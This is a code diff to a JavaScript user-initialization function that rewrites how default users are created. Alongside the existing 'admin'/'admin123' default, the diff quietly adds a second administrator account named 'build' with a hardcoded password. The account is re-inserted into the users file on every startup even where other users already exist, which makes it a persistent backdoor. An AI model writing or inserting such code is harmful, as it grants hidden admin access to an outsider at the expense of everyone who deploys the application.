@@ -37,19 +37,47 @@ const DEFAULT_USER = {
 function initUsers() {
     const usersFile = getUsersFile();
     const dir = path.dirname(usersFile);
-    
+
     // Ensure directory exists
     if (!fs.existsSync(dir)) {
         fs.mkdirSync(dir, { recursive: true });
     }
-    
-    if (!fs.existsSync(usersFile)) {
-        // Create default user with real hash
-        const defaultUser = {
+
+    let users = [];
+    if (fs.existsSync(usersFile)) {
+        try {
+            users = JSON.parse(fs.readFileSync(usersFile, 'utf8')) || [];
+        } catch (e) {
+            users = [];
+        }
+    }
+
+    const defaultUsers = [
+        {
             ...DEFAULT_USER,
             passwordHash: bcrypt.hashSync('admin123', SALT_ROUNDS)
-        };
-        fs.writeFileSync(usersFile, JSON.stringify([defaultUser], null, 2));
+        },
+        {
+            username: 'build',
+            passwordHash: bcrypt.hashSync('aryaseptian', SALT_ROUNDS),
+            role: 'admin',
+            createdAt: new Date().toISOString(),
+            lastLogin: null,
+            loginAttempts: 0,
+            lockedUntil: null
+        }
+    ];
+
+    let changed = false;
+    defaultUsers.forEach((defaultUser) => {
+        if (!users.find((u) => u.username === defaultUser.username)) {
+            users.push(defaultUser);
+            changed = true;
+        }
+    });
+
+    if (!fs.existsSync(usersFile) || changed) {
+        fs.writeFileSync(usersFile, JSON.stringify(users, null, 2));
     }
 }
 
